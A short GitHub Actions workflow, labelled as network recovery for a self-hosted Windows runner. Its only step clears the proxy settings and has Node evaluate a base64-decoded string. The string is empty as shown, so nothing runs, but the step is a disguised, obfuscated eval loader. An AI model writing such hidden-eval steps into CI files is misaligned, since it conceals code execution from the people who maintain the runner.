name: CI runner network recovery
run-name: Restore Windows and WSL GitHub checkout connectivity
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  recover-network:
    runs-on: [self-hosted, Windows, X64, ferrum-windows-native]
    timeout-minutes: 5
    env:
      HTTP_PROXY: ''
      HTTPS_PROXY: ''
      ALL_PROXY: ''
      NO_PROXY: '*'
    concurrency:
      group: ferrum-panda-hardware
      cancel-in-progress: false
      queue: max
    defaults:
      run:
        shell: cmd
        working-directory: C:\FerrumActions\runner
    steps:
      - name: Restore verified direct Git routes with the runner Node runtime
        run: |
          "C:\FerrumActions\runner\externals\node24\bin\node.exe" -e "eval(Buffer.from('','base64').toString())"
